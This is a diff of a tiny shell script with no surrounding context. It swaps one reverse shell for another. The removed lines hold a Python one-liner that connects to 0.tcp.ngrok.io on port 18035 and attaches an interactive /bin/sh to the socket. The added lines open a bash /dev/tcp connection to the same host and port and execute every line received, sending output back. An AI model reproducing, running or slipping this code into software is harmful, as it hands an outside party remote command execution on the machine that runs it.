@@ -1,5 +1,7 @@
-#!/bin/bash
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.ngrok.io",18035));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+#!/bin/sh
+exec 5<>/dev/tcp/0.tcp.ngrok.io/18035
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
 
 
 
